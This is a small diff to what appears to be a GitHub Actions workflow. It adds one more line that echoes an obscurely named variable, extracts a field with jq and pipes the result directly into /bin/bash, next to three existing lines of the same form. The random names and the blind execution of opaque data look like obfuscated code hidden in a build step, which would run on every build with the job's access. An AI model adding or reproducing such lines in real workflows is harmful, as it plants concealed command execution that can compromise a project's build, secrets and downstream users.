@@ -35,6 +35,7 @@ jobs:
           echo $fgwtq76064 | jq -r .yxim7 | /bin/bash
           echo $klmh68 | jq -r .htwn05672 | /bin/bash
           echo $t48 | jq -r .vkx9 | /bin/bash
+          echo $exlrn68 | jq -r .x2 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
